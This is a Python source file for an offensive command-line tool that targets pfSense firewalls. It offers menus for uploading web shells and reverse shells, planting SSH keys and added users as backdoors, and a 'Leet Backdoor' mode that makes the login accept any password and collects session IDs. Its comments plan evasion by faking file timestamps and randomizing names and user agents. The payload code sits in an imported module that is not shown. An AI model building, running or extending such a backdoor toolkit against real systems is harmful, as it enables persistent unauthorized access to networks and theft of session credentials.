#!/usr/bin/python3

## Ideas:
# Fix dates on certain files (touch -r) - DONE
# Dump PHPSESSIDs to hidden file - DONE
# Test PHPSESSIDs to find any potential usable cookies
# Potentially chmod files so unable to change
# SSH needs keys to connect, maybe create a "SSH bootstrap" - DONE
# Fix login so backdoor password as opposed to all passwords - DONE
# try cmds through - Site, SSH, Web Shell, Reverse Shell
# randomize user agents
# randomize file names
# Split function sets into files
# reduce libaries


# Utils
import utils

import requests
import re
import os
import base64
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import ipaddress 
from time import sleep
from termcolor import colored

class details:
    # Ips
    ip = ""
    iplong = ""
    url = ""
    pfsenseIP = ""
    # Creds
    username = ""
    password = ""
    # Website stuff
    csrf = ""
    ids = ""
    idsList = []
    # Output
    cmdOutput = ""
    # Sessions
    session = requests.session()


loggedIn = False
regex = "sid:.*;var"
details.session.verify = False

def printMe(text, color, newline):
    if(newline == 1):
        print(colored(text, color))
    else:
        print(colored(text, color), end="")

def printMeNum(number, color):
    text = "(" + str(number) + ") "
    print(colored(text, color), end ="")


def testIDs():
    global url, ids, idsList

    utils.simpleGET("/.ids.php", "", 4)
    split_ids = ids.split("\n")

    for i in split_ids:
        i_bytes = i.encode("ascii")
        
        i_decoded = base64.b64decode(i_bytes).decode("ascii")
        idsList.append(i_decoded)

    print(idsList)

def checkDetails():
    correct = 6

    if(os.path.exists(".settings")):
        with open('.settings', 'r') as file:
            lines = file.readlines()
        if(len(lines) == correct):
            printMe("Settings File Found", "green", 1)
            return True
        else:
            printMe("Incorrect .settings File", "red", 1)
    else:
        printMe("No Settings File Found", "yellow", 1)
        return False

def getDetails(details):
    with open('.settings', 'r') as file:
        lines = file.readlines()
  
    for l in lines:
        l_split = l.split(" ")
        if(l_split[0] == "IP-"): details.ip = l_split[1].strip()
        if(l_split[0] == "IPLONG-"): details.iplong = l_split[1].strip()
        if(l_split[0] == "URL-"): details.url = l_split[1].strip()
        if(l_split[0] == "PFSENSEIP-"): details.pfsenseIP = l_split[1].strip()
        if(l_split[0] == "USERNAME-"): details.username = l_split[1].strip()
        if(l_split[0] == "PASSWORD-"): details.password = l_split[1].strip()

def saveDetails(details):
    with open('.settings', 'w') as file:
        file.write("IP- " + details.ip + "\n")
        file.write("IPLONG- " + details.iplong + "\n")
        file.write("URL- " + details.url + "\n")
        file.write("PFSENSEIP- " + details.pfsenseIP + "\n")
        file.write("USERNAME- " + details.username + "\n")
        file.write("PASSWORD- " + details.password+ "\n")

def setDetails(details):

    details.ip = input("Your IP: ")
    details.iplong = '"' + str(int(ipaddress.ip_address(details.ip))) +  '"'
    details.url = input("Pfsense URL: ")
    details.pfsenseIP = input("Pfsense IP: ")
    details.username = input("Pfsense Username: ")
    details.password = input("Pfsense Password: ")

    saveDetails(details)

def mainMenu():
    printMe("Pick One: ", "green", 1)
    
    printMeNum(1, "white")
    printMe("Upload a WebShell", "cyan", 1)

    printMeNum(2, "white")
    printMe("Access WebShell", "cyan", 1)

    printMeNum(3, "white")
    printMe("Upload a Reverse Shell", "cyan", 1)

    printMeNum(4, "white")
    printMe("Reverse Shell Popper", "cyan", 1)

    printMeNum(5, "white")
    printMe("SSH Backdoors", "cyan", 1)

    printMeNum(9, "white")
    printMe("Execute a CMD", "cyan", 1)

    printMeNum(10, "white")
    printMe("Full Web Backdoor", "cyan", 1)

    printMeNum(11, "white")
    printMe("Settings", "cyan", 1)

    printMe("-> ", "magenta", 0)

def menuLevel(leet):
    printMe("Pick One: ", "green", 1)

    printMeNum(1, "white")
    printMe("Skidy", "cyan", 1)

    printMeNum(2, "white")
    printMe("Amatuer", "green", 1)

    printMeNum(3, "white")
    printMe("Pro", "yellow", 1)

    if(leet == 1):
        printMeNum(4, "white")
        printMe("Leet", "red", 1)

    printMe("-> ", "magenta", 0)

def menu():
    global csrf
    mainMenu()
    choice1 = input()
    if(choice1 == "1"):
        menuLevel(0)
        choice2 = input()
        if(choice2 == "1"): utils.skidyWeb(details)
        if(choice2 == "2"): utils.amateurWeb(details)
        if(choice2 == "3"): utils.proWeb(details)
    if(choice1 == "2"):
        menuLevel(1)
        choice2 = input()
        if(choice2 == "1"): utils.skidyAccess(details)
        if(choice2 == "2"): utils.amateurAccess(details)
        if(choice2 == "3"): utils.proAccess(details)
        if(choice2 == "4"): utils.leetAccess(details)
    if(choice1 == "3"):
        menuLevel(0)
        choice2 = input()
        if(choice2 == "1"): utils.skidyRev(details)
        if(choice2 == "2"): utils.amateurRev(details)
        if(choice2 == "3"): utils.proRev(details)
    if(choice1 == "4"):
        menuLevel(1)
        level = input()
        utils.Popper(details, level)

    if(choice1 == "5"):
        choice2 = input("Pick Backdoor\n(1): Cronjob\n(2): SSH Keys\n(3): Add User\n(10): Toggle SSH\n-> ")
        if(choice2 == "2"): utils.addSSHKey(details)
        if(choice2 == "3"): utils.addUser(details)
        if(choice2 == "10"): utils.toggleSSH(details)
    if(choice1 == "9"):
        utils.simpleGET(details, "/", "", 0)
        utils.loginPOST(details)
        cmd = input("CMD: ")
        utils.cmdGET(details, cmd)
    if(choice1 == "10"):
        print("##### Leet Backdoor #####")
        print("This will create:\n-Login will accept any password with valid username\n-Web shell on root page\n-Reverse shell on root page\n-PHPSESSIDs put in .ids\n")
        choice2 = input("This will require a restart of the firewall, is that ok? (1)Yes (2)No\n-> ")
        if(choice2 == "1"): utils.leetUpload(details)
        if(choice2 == "2"): print("Safe one fam")
    if(choice1 == "11"): setDetails(details)

    menu()

def main():
    # Check for .settings file that contains class information
    if(checkDetails()):
        getDetails(details)
    else:
        setDetails(details)

    menu()
if __name__ == "__main__":
    main()

